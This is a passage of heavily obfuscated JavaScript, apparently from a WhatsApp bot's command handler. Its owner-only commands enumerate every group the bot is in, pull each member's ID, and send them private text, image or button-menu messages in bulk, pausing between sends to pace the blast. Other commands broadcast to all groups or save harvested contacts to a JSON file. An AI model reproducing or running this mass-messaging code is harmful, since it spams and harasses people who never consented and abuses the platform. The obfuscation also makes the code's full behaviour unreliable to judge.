                                'mimetype': _0x2a5309[_0x5d4417(0x9ab)]
                            }, { 'quoted': _0xedb653 });
                            continue;
                        case '2':
                            await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x4e1)], '');
                            continue;
                        case '3':
                            await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0xc28)], JSON[_0x5d4417(0x78f)](contacts));
                            continue;
                        case '4':
                            contacts[_0x5d4417(0xa5a)](-0xb58 + -0x8 * 0x290 + 0x1fd8, contacts[_0x5d4417(0xf65)]);
                            continue;
                        }
                        break;
                    }
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0xd42)]: {
                if (!isOwner)
                    return _0x2a5309[_0x5d4417(0x3b3)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x10b1)](_0x1ac933, _0x2a5309[_0x5d4417(0xe7e)]));
                const _0x1327c6 = await _0x57ed02[_0x5d4417(0x50e) + _0x5d4417(0xcd3) + _0x5d4417(0xbb3)]();
                let _0x13ea7c = await Object[_0x5d4417(0x1af)](_0x1327c6);
                global[_0x5d4417(0x262) + _0x5d4417(0x313)] = _0x156b97;
                let _0x41e170 = [];
                for (let _0x3c38f5 of _0x13ea7c) {
                    await _0x41e170[_0x5d4417(0x706)]({
                        'title': _0x1327c6[_0x3c38f5][_0x5d4417(0x9e0)],
                        'id': _0x5d4417(0x1ec) + _0x5d4417(0x83f) + _0x3c38f5,
                        'description': _0x1327c6[_0x3c38f5][_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0xf65)] + _0x5d4417(0x2df)
                    });
                }
                return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'buttons': [{
                            'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                            'type': 0x4,
                            'nativeFlowInfo': {
                                'name': _0x2a5309[_0x5d4417(0xdc6)],
                                'paramsJson': JSON[_0x5d4417(0x78f)]({
                                    'title': _0x2a5309[_0x5d4417(0x625)],
                                    'sections': [{
                                            'title': _0x2a5309[_0x5d4417(0x7d0)],
                                            'rows': [..._0x41e170]
                                        }]
                                })
                            }
                        }],
                    'footer': _0x5d4417(0xee4) + botname,
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'text': _0x2a5309[_0x5d4417(0x1037)],
                    'contextInfo': {
                        'isForwarded': !![],
                        'mentionedJid': [
                            _0xedb653[_0x5d4417(0xeee)],
                            _0x2a5309[_0x5d4417(0x6d1)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                        ]
                    }
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x11a0)]: {
                if (!isOwner)
                    return;
                if (!_0x156b97)
                    return;
                if (!global[_0x5d4417(0x262) + _0x5d4417(0x313)])
                    return;
                const _0x4d4332 = _0x156b97, _0x57ccba = global[_0x5d4417(0x262) + _0x5d4417(0x313)], _0x4a0c90 = _0xedb653[_0x5d4417(0x9e2)], _0x303e80 = await _0x57ed02[_0x5d4417(0xe80) + _0x5d4417(0x4ce)](_0x4d4332), _0x547dff = await _0x303e80[_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0xde7)](_0x18d27c => _0x18d27c['id'][_0x5d4417(0xdb3)](_0x5d4417(0xea1)))[_0x5d4417(0x462)](_0x44d4e7 => _0x44d4e7['id']);
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0xd2e) + _0x5d4417(0x871) + _0x5d4417(0xd9f) + _0x303e80[_0x5d4417(0x9e0)] + '*');
                for (let _0x3e1598 of _0x547dff) {
                    _0x2a5309[_0x5d4417(0x73c)](_0x3e1598, _0x4815f3) && _0x2a5309[_0x5d4417(0xa4d)](_0x3e1598[_0x5d4417(0xc6c)]('@')[-0xa8b + 0x864 + 0x227], global[_0x5d4417(0x41d)]) && (await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x3e1598, { 'text': _0x57ccba }, { 'quoted': _0x4afe4b }), await _0x2a5309[_0x5d4417(0x4fb)](sleep, global[_0x5d4417(0x484) + _0x5d4417(0xd6f)]));
                }
                delete global[_0x5d4417(0x262) + _0x5d4417(0x313)], await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x4a0c90, { 'text': _0x5d4417(0x479) + _0x5d4417(0x797) + _0x5d4417(0xb90) + _0x5d4417(0x69b) + _0x5d4417(0x7c0) + _0x5d4417(0x5d7) + ':\x20' + _0x547dff[_0x5d4417(0xf65)] }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x53b)]: {
                if (!isOwner)
                    return _0x2a5309[_0x5d4417(0xd51)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x864)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe5d)](_0x1ac933, _0x2a5309[_0x5d4417(0xe7e)]));
                const _0x56c63e = _0x156b97, _0x36fb74 = _0xedb653[_0x5d4417(0x9e2)], _0x49e5d5 = await _0x57ed02[_0x5d4417(0xe80) + _0x5d4417(0x4ce)](_0xedb653[_0x5d4417(0x9e2)]), _0x29cc6f = await _0x49e5d5[_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0xde7)](_0x13c8e6 => _0x13c8e6['id'][_0x5d4417(0xdb3)](_0x5d4417(0xea1)))[_0x5d4417(0x462)](_0x1429e7 => _0x1429e7['id']);
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0x1133) + _0x5d4417(0xc26) + _0x29cc6f[_0x5d4417(0xf65)] + (_0x5d4417(0xc33) + _0x5d4417(0x970)));
                for (let _0x1891a1 of _0x29cc6f) {
                    _0x2a5309[_0x5d4417(0xe21)](_0x1891a1, _0x4815f3) && _0x2a5309[_0x5d4417(0x73c)](_0x1891a1[_0x5d4417(0xc6c)]('@')[-0x18ad + 0x14d9 * -0x1 + 0x2d86], global[_0x5d4417(0x41d)]) && (await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x1891a1, { 'text': _0x56c63e }, { 'quoted': _0x4afe4b }), await _0x2a5309[_0x5d4417(0x985)](sleep, global[_0x5d4417(0x484) + _0x5d4417(0xd6f)]));
                }
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x36fb74, { 'text': _0x5d4417(0x479) + _0x5d4417(0x797) + _0x5d4417(0xb90) + _0x5d4417(0x69b) + _0x5d4417(0x7c0) + _0x5d4417(0x5d7) + ':\x20' + _0x29cc6f[_0x5d4417(0xf65)] }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x917)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xda3)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0xd4a055 = await _0x57ed02[_0x5d4417(0x50e) + _0x5d4417(0xcd3) + _0x5d4417(0xbb3)](), _0x532075 = await Object[_0x5d4417(0x1af)](_0xd4a055), _0x52e38c = -0x577 * 0x3 + -0x4 * -0x3e5 + 0xd1;
                const _0x28b5bc = _0xedb653[_0x5d4417(0x9e2)];
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0xad7) + _0x5d4417(0x960) + _0x532075[_0x5d4417(0xf65)] + _0x5d4417(0x382));
                for (let _0xc34271 of _0x532075) {
                    if (global['db'][_0x5d4417(0x73a)][_0xc34271] && global['db'][_0x5d4417(0x73a)][_0xc34271][_0x5d4417(0xd0f) + 'pm'] && _0x2a5309[_0x5d4417(0x9f5)](global['db'][_0x5d4417(0x73a)][_0xc34271][_0x5d4417(0xd0f) + 'pm'], !![]))
                        continue;
                    try {
                        await _0x2a5309[_0x5d4417(0xe5d)](_0x19401b, _0xc34271), _0x52e38c += 0x1acc + 0x255a + -0x4025;
                    } catch {
                    }
                    await _0x2a5309[_0x5d4417(0x3a3)](sleep, global[_0x5d4417(0xf32)]);
                }
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x28b5bc, { 'text': _0x5d4417(0xd64) + _0x5d4417(0xa52) + _0x5d4417(0xb87) + _0x5d4417(0x25d) + _0x5d4417(0x7c0) + _0x5d4417(0x5d7) + ':\x20' + _0x52e38c }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x1ea)]:
        case _0x2a5309[_0x5d4417(0xdbb)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x3e4)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x2a3b67 = await _0x57ed02[_0x5d4417(0x50e) + _0x5d4417(0xcd3) + _0x5d4417(0xbb3)](), _0x40d370 = await Object[_0x5d4417(0x1af)](_0x2a3b67), _0x384014 = -0x15 * 0x12b + -0x228d + 0x3b14;
                const _0x4914da = _0xedb653[_0x5d4417(0x9e2)];
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0x2e3) + _0x5d4417(0x55d) + 'e\x20' + _0x40d370[_0x5d4417(0xf65)] + _0x5d4417(0x382));
                for (let _0x5e5995 of _0x40d370) {
                    if (global['db'][_0x5d4417(0x73a)][_0x5e5995] && global['db'][_0x5d4417(0x73a)][_0x5e5995][_0x5d4417(0xd0f) + 'pm'] && _0x2a5309[_0x5d4417(0xb8f)](global['db'][_0x5d4417(0x73a)][_0x5e5995][_0x5d4417(0xd0f) + 'pm'], !![]))
                        continue;
                    try {
                        await _0x2a5309[_0x5d4417(0x984)](_0x19401b, _0x5e5995, _0x2a3b67[_0x5e5995][_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0x462)](_0x496dd6 => _0x496dd6['id'])), _0x384014 += -0x17b * 0x3 + -0x1d * 0xa7 + -0x175d * -0x1;
                    } catch {
                    }
                    await _0x2a5309[_0x5d4417(0xccd)](sleep, global[_0x5d4417(0xf32)]);
                }
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x4914da, { 'text': _0x5d4417(0xd64) + _0x5d4417(0xa52) + _0x5d4417(0xb87) + _0x5d4417(0x25d) + _0x5d4417(0x7c0) + _0x5d4417(0x5d7) + ':\x20' + _0x384014 }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x3a7)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xbf2)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!q)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbad)](_0x1ac933, _0x2a5309[_0x5d4417(0xe5e)]));
                let _0x545f43 = await _0x57ed02[_0x5d4417(0x50e) + _0x5d4417(0xcd3) + _0x5d4417(0xbb3)](), _0x293c66 = await Object[_0x5d4417(0x1af)](_0x545f43), _0x23f0d3 = -0xe44 + -0x1275 + 0x20b9;
                const _0x120797 = _0xedb653[_0x5d4417(0x9e2)], _0x292f6b = _0x156b97;
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0x199) + _0x5d4417(0x960) + _0x293c66[_0x5d4417(0xf65)] + _0x5d4417(0x382));
                for (let _0x464e88 of _0x293c66) {
                    if (global['db'][_0x5d4417(0x73a)][_0x464e88] && global['db'][_0x5d4417(0x73a)][_0x464e88][_0x5d4417(0xd0f) + 'pm'] && _0x2a5309[_0x5d4417(0x883)](global['db'][_0x5d4417(0x73a)][_0x464e88][_0x5d4417(0xd0f) + 'pm'], !![]))
                        continue;
                    try {
                        await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x464e88, { 'text': '' + _0x292f6b }, { 'quoted': _0x3fcf94 }), _0x23f0d3 += -0x1 * 0x24d9 + -0xe7d + 0x151 * 0x27;
                    } catch {
                    }
                    await _0x2a5309[_0x5d4417(0xdf1)](sleep, global[_0x5d4417(0xf32)]);
                }
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x120797, { 'text': _0x5d4417(0xd64) + _0x5d4417(0xa52) + _0x5d4417(0xb87) + _0x5d4417(0x25d) + _0x5d4417(0x7c0) + _0x5d4417(0x5d7) + ':\x20' + _0x23f0d3 }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x490)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xb22)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!q)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe55)](_0x1ac933, _0x2a5309[_0x5d4417(0xbca)]));
                if (!/image/[_0x5d4417(0x8cc)](_0x5a9802))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x246)](_0x1ac933, _0x2a5309[_0x5d4417(0xbca)]));
                const _0x200194 = await _0x57ed02[_0x5d4417(0x50e) + _0x5d4417(0xcd3) + _0x5d4417(0xbb3)](), _0x24b7d0 = await Object[_0x5d4417(0x1af)](_0x200194);
                let _0x3dfafc = -0x16c + 0x1339 + -0x93 * 0x1f;
                const _0x5377d1 = _0x156b97, _0x20e821 = _0xedb653[_0x5d4417(0x9e2)], _0x180f7d = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0x199) + _0x5d4417(0x568) + '\x20' + _0x24b7d0[_0x5d4417(0xf65)] + _0x5d4417(0x382));
                for (let _0x56df8f of _0x24b7d0) {
                    if (global['db'][_0x5d4417(0x73a)][_0x56df8f] && global['db'][_0x5d4417(0x73a)][_0x56df8f][_0x5d4417(0xd0f) + 'pm'] && _0x2a5309[_0x5d4417(0xd93)](global['db'][_0x5d4417(0x73a)][_0x56df8f][_0x5d4417(0xd0f) + 'pm'], !![]))
                        continue;
                    try {
                        await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x56df8f, {
                            'image': fs[_0x5d4417(0xf73) + 'nc'](_0x180f7d),
                            'caption': _0x5377d1
                        }, { 'quoted': _0x3fcf94 }), _0x3dfafc += 0x4 * 0x890 + -0x6c8 + -0x1b77;
                    } catch {
                    }
                    await _0x2a5309[_0x5d4417(0x650)](sleep, global[_0x5d4417(0xf32)]);
                }
                await fs[_0x5d4417(0xf9e)](_0x180f7d), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x20e821, { 'text': _0x5d4417(0xd64) + _0x5d4417(0xa52) + _0x5d4417(0xb87) + _0x5d4417(0x25d) + _0x5d4417(0x7c0) + _0x5d4417(0x5d7) + ':\x20' + _0x3dfafc }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0xd48)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xe26)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!q)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x831)](_0x1ac933, _0x2a5309[_0x5d4417(0xbca)]));
                if (!/image/[_0x5d4417(0x8cc)](_0x5a9802))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1fc)](_0x1ac933, _0x2a5309[_0x5d4417(0xbca)]));
                const _0x59f5df = await _0x57ed02[_0x5d4417(0x50e) + _0x5d4417(0xcd3) + _0x5d4417(0xbb3)](), _0x46b2b4 = await Object[_0x5d4417(0x1af)](_0x59f5df);
                let _0x398c80 = -0x110 * -0x4 + 0x26b0 + -0x2af0;
                const _0x2de54d = _0x156b97, _0x503674 = _0xedb653[_0x5d4417(0x9e2)], _0x581974 = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0x184) + _0x5d4417(0x48e) + _0x46b2b4[_0x5d4417(0xf65)] + _0x5d4417(0x382));
                for (let _0x588fcc of _0x46b2b4) {
                    if (global['db'][_0x5d4417(0x73a)][_0x588fcc] && global['db'][_0x5d4417(0x73a)][_0x588fcc][_0x5d4417(0xd0f) + 'pm'] && _0x2a5309[_0x5d4417(0xddb)](global['db'][_0x5d4417(0x73a)][_0x588fcc][_0x5d4417(0xd0f) + 'pm'], !![]))
                        continue;
                    try {
                        await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x588fcc, {
                            'footer': _0x5d4417(0xee4) + botname,
                            'buttons': [{
                                    'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                    'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                    'type': 0x4,
                                    'nativeFlowInfo': {
                                        'name': _0x2a5309[_0x5d4417(0xdc6)],
                                        'paramsJson': JSON[_0x5d4417(0x78f)]({
                                            'title': _0x2a5309[_0x5d4417(0xc3c)],
                                            'sections': [{
                                                    'title': _0x2a5309[_0x5d4417(0x6e0)],
                                                    'highlight_label': _0x2a5309[_0x5d4417(0x3b9)],
                                                    'rows': [
                                                        {
                                                            'title': _0x2a5309[_0x5d4417(0x92b)],
                                                            'id': _0x2a5309[_0x5d4417(0x52f)]
                                                        },
                                                        {
                                                            'title': _0x2a5309[_0x5d4417(0xe99)],
                                                            'id': _0x2a5309[_0x5d4417(0xd25)]
                                                        },
                                                        {
                                                            'title': _0x2a5309[_0x5d4417(0x49f)],
                                                            'id': _0x2a5309[_0x5d4417(0x9f1)]
                                                        },
                                                        {
                                                            'title': _0x2a5309[_0x5d4417(0x3c6)],
                                                            'id': _0x2a5309[_0x5d4417(0x1bb)]
                                                        }
                                                    ]
                                                }]
                                        })
                                    }
                                }],
                            'headerType': 0x1,
                            'viewOnce': !![],
                            'image': await fs[_0x5d4417(0xf73) + 'nc'](_0x581974),
                            'caption': '\x0a' + _0x2de54d + '\x0a',
                            'contextInfo': {
                                'isForwarded': !![],
                                'forwardedNewsletterMessageInfo': {
                                    'newsletterJid': global[_0x5d4417(0x754)],
                                    'newsletterName': global[_0x5d4417(0x518) + 'n']
                                }
                            }
                        }, { 'quoted': _0x48a9c1 }), _0x398c80 += 0xbda + -0x1afa + 0x3 * 0x50b;
                    } catch {
                    }
                    await _0x2a5309[_0x5d4417(0x474)](sleep, global[_0x5d4417(0xf32)]);
                }
                await fs[_0x5d4417(0xf9e)](_0x581974), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x503674, { 'text': _0x5d4417(0xd64) + _0x5d4417(0xa52) + _0x5d4417(0xb87) + _0x5d4417(0x25d) + _0x5d4417(0x7c0) + _0x5d4417(0x5d7) + ':\x20' + _0x398c80 }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x114b)]:
        case _0x2a5309[_0x5d4417(0xaa7)]:
        case _0x2a5309[_0x5d4417(0x9b7)]: {
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'footer': _0x5d4417(0xee4) + botname,
                    'buttons': [{
                            'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                            'type': 0x4,
                            'nativeFlowInfo': {
                                'name': _0x2a5309[_0x5d4417(0xdc6)],
                                'paramsJson': JSON[_0x5d4417(0x78f)]({
                                    'title': _0x2a5309[_0x5d4417(0x559)],
                                    'sections': [{
                                            'title': _0x2a5309[_0x5d4417(0x206)],
                                            'rows': [
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0xb30)],
                                                    'id': _0x2a5309[_0x5d4417(0x293)]
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x4c0)],
                                                    'id': _0x2a5309[_0x5d4417(0xdd0)]
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x5dc)],
                                                    'id': _0x2a5309[_0x5d4417(0xc64)]
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x10e9)],
                                                    'id': _0x2a5309[_0x5d4417(0x266)]
                                                }
                                            ]
                                        }]
                                })
                            }
                        }],
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'image': { 'url': global[_0x5d4417(0xd55)][_0x5d4417(0xbe5)] },
                    'caption': _0x2a5309[_0x5d4417(0x1d4)]
                }, { 'quoted': _0xa27a38 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x4f9)]: {
                if (!_0x47f98c)
                    return;
                let _0x1179b7 = _0x5d4417(0x1d6) + _0x5d4417(0xec2) + global[_0x5d4417(0x37e)][_0x5d4417(0xe3f) + 'e']() + (_0x5d4417(0x5cb) + _0x5d4417(0xb62)) + global[_0x5d4417(0x249)] + (_0x5d4417(0x9be) + _0x5d4417(0xd35) + _0x5d4417(0x214) + _0x5d4417(0x11be) + _0x5d4417(0xc62) + _0x5d4417(0x6af) + _0x5d4417(0xabc) + _0x5d4417(0x6ee) + _0x5d4417(0x618) + _0x5d4417(0x446) + _0x5d4417(0x11f5));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x1179b7 }, { 'quoted': _0xa27a38 });
            }
            break;
        case _0x2a5309[_0x5d4417(0xeda)]: {
                if (!_0x47f98c)
                    return;
                let _0x16ef97 = _0x5d4417(0x1d6) + _0x5d4417(0xf2e) + global[_0x5d4417(0x37e)][_0x5d4417(0xe3f) + 'e']() + (_0x5d4417(0x5cb) + _0x5d4417(0xb62)) + global[_0x5d4417(0x3ea)] + (_0x5d4417(0x11c2) + _0x5d4417(0xff6) + _0x5d4417(0xef0) + _0x5d4417(0xb6d) + _0x5d4417(0x5ff) + _0x5d4417(0xf9c) + _0x5d4417(0x520) + _0x5d4417(0xf2a));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x16ef97 }, { 'quoted': _0xa27a38 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x106d)]: {
                if (!_0x47f98c)
                    return;
                let _0xa73200 = _0x5d4417(0x1d6) + _0x5d4417(0x617) + global[_0x5d4417(0x37e)][_0x5d4417(0xe3f) + 'e']() + (_0x5d4417(0x5cb) + _0x5d4417(0xb62)) + global[_0x5d4417(0xc3e)] + (_0x5d4417(0x11c2) + _0x5d4417(0xff6) + _0x5d4417(0xef0) + _0x5d4417(0xb6d) + _0x5d4417(0x5ff) + _0x5d4417(0xf9c) + _0x5d4417(0x520) + _0x5d4417(0xf2a));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0xa73200 }, { 'quoted': _0xa27a38 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x273)]: {
                if (!_0x47f98c)
                    return;
                let _0xe9b237 = _0x5d4417(0x1d6) + _0x5d4417(0x35e) + global[_0x5d4417(0x37e)][_0x5d4417(0xe3f) + 'e']() + (_0x5d4417(0x5cb) + _0x5d4417(0xb62)) + global[_0x5d4417(0x11ca)] + (_0x5d4417(0x11c2) + _0x5d4417(0xff6) + _0x5d4417(0xef0) + _0x5d4417(0xb6d) + _0x5d4417(0x5ff) + _0x5d4417(0xf9c) + _0x5d4417(0x520) + _0x5d4417(0xf2a));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0xe9b237 }, { 'quoted': _0xa27a38 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x106f)]:
        case 'q': {
                if (!_0xedb653[_0x5d4417(0x7eb)])
                    return;
                let _0x3ee6ee = JSON[_0x5d4417(0x78f)](_0xedb653[_0x5d4417(0x7eb)], null, 0xd02 + -0x2613 + 0x1913);
                _0xedb653[_0x5d4417(0x105d)](_0x3ee6ee);
            }
            break;
        case _0x2a5309[_0x5d4417(0xca7)]:
        case _0x2a5309[_0x5d4417(0x45f)]: {
                if (!/video|mp4/[_0x5d4417(0x8cc)](_0x5a9802))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb15)](_0x1ac933, _0x2a5309[_0x5d4417(0xe22)]));
                const _0x2fd865 = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08), _0x1780f2 = await _0x2a5309[_0x5d4417(0x26e)](toAudio, fs[_0x5d4417(0xf73) + 'nc'](_0x2fd865), _0x2a5309[_0x5d4417(0x3d4)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'audio': _0x1780f2,
                    'mimetype': _0x2a5309[_0x5d4417(0x894)],
                    'ptt': /tovn/[_0x5d4417(0x8cc)](_0x224056) ? !![] : ![]
                }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0x2fd865);
            }
            break;
        case _0x2a5309[_0x5d4417(0x8b3)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xc5f)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!q)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x6a3)](_0x1ac933, _0x2a5309[_0x5d4417(0xbcc)]));
                let _0x52e67a = _0x5d4417(0x1132) + _0x156b97 + _0x5d4417(0x449) + _0x2a5309[_0x5d4417(0x7a0)](tanggal, Date[_0x5d4417(0xc8a)]()) + (_0x5d4417(0x9ee) + _0x5d4417(0x406)) + linkSaluran + (_0x5d4417(0x71b) + _0x5d4417(0xe2c)) + linkGrup;
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x52e67a,
                    'mentions': [_0xedb653[_0x5d4417(0xeee)]],
                    'contextInfo': {
                        'externalAdReply': {
                            'title': _0x5d4417(0x10f1) + '\x20✅',
                            'body': _0x5d4417(0x9e5),
                            'thumbnailUrl': global[_0x5d4417(0xd55)][_0x5d4417(0x105d)],
                            'sourceUrl': linkSaluran
                        }
                    }
                }, { 'quoted': null });
            }
            break;
        case _0x2a5309[_0x5d4417(0x289)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x246)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!q)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x24a)](_0x1ac933, _0x2a5309[_0x5d4417(0xbcc)]));
                let _0x28c02b = _0x5d4417(0x1132) + _0x156b97 + _0x5d4417(0x449) + _0x2a5309[_0x5d4417(0xee5)](tanggal, Date[_0x5d4417(0xc8a)]()) + (_0x5d4417(0x9ee) + _0x5d4417(0x406)) + linkSaluran + (_0x5d4417(0x71b) + _0x5d4417(0xe2c)) + linkGrup;
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x28c02b,
                    'mentions': [_0xedb653[_0x5d4417(0xeee)]],
                    'contextInfo': {
                        'externalAdReply': {
                            'title': _0x5d4417(0x680) + _0x5d4417(0xa0e),
                            'body': _0x5d4417(0x9e5),
                            'thumbnailUrl': global[_0x5d4417(0xd55)][_0x5d4417(0x105d)],
                            'sourceUrl': linkSaluran
                        }
                    }
                }, { 'quoted': null });
            }
            break;
        case _0x2a5309[_0x5d4417(0xb46)]:
        case _0x2a5309[_0x5d4417(0x6a1)]: {
                await _0x57ed02[_0x5d4417(0x8ff) + 't'](_0xedb653[_0x5d4417(0x9e2)], [global[_0x5d4417(0x41d)]], _0xedb653);
            }
            break;
        case _0x2a5309[_0x5d4417(0xb35)]:
        case 'sv': {
                if (!_0x47f98c)
                    return;
                await _0x57ed02[_0x5d4417(0x8ff) + 't'](_0xedb653[_0x5d4417(0x9e2)], [_0xedb653[_0x5d4417(0x9e2)][_0x5d4417(0xc6c)]('@')[0x3 * -0xa0a + -0x123e + 0x305c]], _0xedb653);
            }
            break;
        case _0x2a5309[_0x5d4417(0x4a0)]: {
                if (!_0x47f98c)
                    return;
                _0x57ed02[_0x5d4417(0x425)] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x540)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0xc32)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xe95)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2bf)](_0x1ac933, _0x2a5309[_0x5d4417(0xd27)]));
                const _0x5f1ec8 = _0x578fe6 => {
                    const _0x73e2f9 = _0x5d4417;
                    return _0x2a5309[_0x73e2f9(0x202)](_0x2a5309[_0x73e2f9(0x202)](_0x2a5309[_0x73e2f9(0x2d2)](_0x2a5309[_0x73e2f9(0x322)], '\x22' + _0x578fe6 + '\x22'), fs[_0x73e2f9(0xf73) + 'nc'](_0x2a5309[_0x73e2f9(0xd99)])[_0x73e2f9(0xef4)]()[_0x73e2f9(0xc6c)](_0x2a5309[_0x73e2f9(0x90d)](_0x2a5309[_0x73e2f9(0x90d)](_0x2a5309[_0x73e2f9(0x3de)], _0x578fe6), '\x22'))[0x1f9 + -0x1 * -0x7b1 + 0x1 * -0x9a9][_0x73e2f9(0xc6c)](_0x2a5309[_0x73e2f9(0xefb)])[-0x2386 * -0x1 + 0x1604 + -0x398a]), _0x2a5309[_0x73e2f9(0xefb)]);
                };
                try {
                    _0xedb653[_0x5d4417(0x105d)]('' + _0x2a5309[_0x5d4417(0x7cd)](_0x5f1ec8, q));
                } catch (_0xe36233) {
